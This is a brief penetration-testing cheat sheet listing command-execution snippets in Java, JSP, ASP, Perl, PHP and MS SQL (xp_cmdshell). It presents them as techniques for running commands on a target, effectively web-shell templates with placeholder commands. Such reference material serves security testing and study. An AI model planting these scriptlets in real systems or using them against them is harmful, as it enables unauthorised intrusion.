## RFI Cheetsheet

> This table provides a handy list of techniques that can be used for remote command execution, by language.

#### Java Servlet

- http://java.sun.com/j2se/1.4/docs/api/java/lang/Runtime.html

```java
class Example extends HTTPServlet {
  void function() {
    Runtime r = Runtime.getRuntime();
    Process p = r.exec("<command>", <arguments>);
  }
}
```

#### Java Server Pages (JSP)

- http://java.sun.com/j2se/1.4/docs/api/java/lang/Runtime.html

```java
<%
     Runtime r = Runtime.getRuntime();
     Process p = r.exec("<command>", <arguments>);
%>
```

#### Active Server Pages (ASP)

- http://msdn.microsoft.com/library/default.asp?url=/library/en-us/script56/html/wsMthRun.asp

If Windows Scripting Host is installed on the target system:

```asp
<%
     Set wsh = Server.CreateObject("Wscript.shell")
     wsh.run("<command>");
%>
```

#### PERL

In PERL, commands are executed by wrapping them with the backtick symbol (`)

- http://www.perldoc.com/perl5.6/pod/perlfunc.html

```perl
// examples
$result = `<command>`;
system("<command>");
open(IN, "<command> |");
```

#### PHP

- http://www.php.net/manual/en/function.shell-exec.php

```php
// examples
<? system("<command>") ?>
<? shell_exec("<command>") ?>
```

#### MS SQL

```sql
EXEC master..xp_cmdshell" <command>"
```
